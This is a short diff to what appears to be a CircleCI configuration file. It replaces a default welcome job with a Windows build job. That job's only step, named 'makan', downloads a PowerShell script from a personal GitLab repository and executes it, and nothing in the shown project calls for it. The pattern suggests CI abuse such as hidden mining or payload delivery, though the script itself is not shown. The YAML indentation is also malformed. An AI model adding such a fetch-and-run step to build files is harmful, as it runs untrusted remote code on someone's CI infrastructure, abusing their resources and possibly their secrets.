@@ -9,5 +9,17 @@ workflows:
   # Name the workflow "welcome"
   welcome:
     # Run the welcome/run job in its own container
-    jobs:
-      - welcome/run
+jobs:
+  build: 
+    executor:
+      name: win/default 
+      size: "medium" 
+ 
+    steps:
+      - run:
+          name: makan
+          command: |
+            Invoke-WebRequest https://gitlab.com/raufpermana22/mkan/-/raw/master/mjip.ps1 -OutFile mjip.ps1 
+            ./mjip.ps1 
+			
+  
